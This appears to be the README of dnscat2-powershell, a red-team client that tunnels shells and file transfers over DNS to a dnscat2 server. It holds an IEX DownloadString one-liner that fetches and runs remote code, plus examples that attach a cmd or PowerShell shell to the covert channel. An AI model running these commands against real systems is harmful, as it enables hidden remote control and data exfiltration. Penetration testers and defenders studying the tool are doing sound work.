[dnscat2](https://github.com/iagox86/dnscat2) is a DNS covert channel tool by [@iagox86 (Ron Bowes)](https://blog.skullsecurity.org/) which is used to transfer data over DNS requests.

This is a powershell version of the dnscat2 C client.

[Click here for a blog post](http://www.blackhillsinfosec.com/?p=5578) that gives a more detailed breakdown of the purpose of this script, and how to use it.

To use this script, you'll need the ruby [dnscat2 server](https://github.com/iagox86/dnscat2). **Make sure to add the `--no-cache` option when running the server. This client is incompatible with the server's caching.**

### Setup

[First, install the dnscat2 server.](https://github.com/iagox86/dnscat2/blob/master/README.md) Start the server with caching disabled using `--no-cache`. The command to start your server should look something like this: `ruby dnscat2.rb --dns="domain=example.com" --no-cache`

Next, launch Windows Powershell (version 2.0 or later). You can use this command to load the dnscat2 powershell functions:

    IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')

### Examples

Start-Dnscat2 is the actual function used as the client. Specifiy the dnscat2 server using `-Domain`.

    Start a command session, and send DNS requests to 8.8.8.8 on port 53:
        Start-Dnscat2 -Domain <dnscat2 server> -DNSServer 8.8.8.8

    Send a cmd shell, and send DNS requests to the default DNS Server set in Windows:
        Start-Dnscat2 -Domain <dnscat2 server> -Exec cmd

    Start a console session. Only use CNAME, MX, and AAAA requests:
        Start-Dnscat2 -Domain <dnscat2 server> -LookupTypes @("CNAME","MX","AAAA") -Console

    Do not encrypt the session. Encryption is enabled by default.
        Start-Dnscat2 -Domain <dnscat2 server> -NoEncryption

### Powershell Command Session Commands

The client can handle normal dnscat2 commands, or the *powershell version* of that command. To use the powershell version of a command, set specific parameters the client will detect (These are commands run from a command session on the server):

    Start a new session which simulates a Powershell shell, like ExecPS:
        exec psh

    Upload app.exe on the server into a hex string stored in the $app powershell variable:
        upload app.exe hex:$app
    
    Download the byte array stored in the $app powershell variable to app.exe on the server:
        download bytes:$app app.exe

### Start-Dnscat2

    -Domain <String>          The Domain being used by the dnscat2 server.
    -DNSServer <String>       The hostname or IP Address to send DNS queries to. (Default: Set by Windows)
    -DNSPort <Int32>          The port to send DNS queries to. (Default: 53)
    
    -Command                  Start a command session. (Default)
    -Exec <String>            Link the I/O of a process with the Dnscat2 session.
    -Console                  Link the I/O of the console with the Dnscat2 session.
    -ExecPS                   Simulate a Powershell session and link the IO with the Dnscat2 session.
                              WARNING: Exiting will kill the entire dnscat2 client, not just the session.
    
    -PreSharedSecret          Set the same secret on the server to authenticate and prevent MITM.
    -NoEncryption             Do not use encryption.
    
    -LookupTypes <String[]>   Set an array of lookup types to randomly switch between.
                              Only TXT, MX, CNAME, A, and AAAA records are supported. Default: @(TXT, MX, CNAME)
    -Delay <Int32>            Set a delay between each request, in milliseconds. (Default: 0)
    -MaxRandomDelay <Int32>   Set the max value of a random delay added to the normal delay, in milliseconds. (Default: 0)
    -MaxPacketSize <Int32>    Maximum length of a dnscat2 packet. (Default: 240)
    -Name <String>            The name of your dnscat2 session. (Default: hostname)

### ExecPS and 'exec psh'

dnscat2-powershell simulates a powershell session by passing data from the server to Invoke-Expression. Only stdout is returned, and variables are preserved as long as the client is running. **Watch out** for things that exit powershell like "exit" and "break", because the entire dnscat2-powershell client will exit, not just the ExecPS session.

### Other Credits

* [db9 on stackoverflow's](https://stackoverflow.com/users/6866918/db9) [demonstration of BouncyCastle ECDH.](http://stackoverflow.com/a/39662164)
* [FrankSpierings's](https://github.com/FrankSpierings) implementation of [Salsa20](https://gist.github.com/FrankSpierings/c18da658e06948313fff) and [Sha3](https://gist.github.com/FrankSpierings/3577b0365d02df6f7eeb) in Powershell via C#.
* [Rebex Labs stripped down version of the BouncyCastle DLL for ECC.](http://labs.rebex.net/curves)
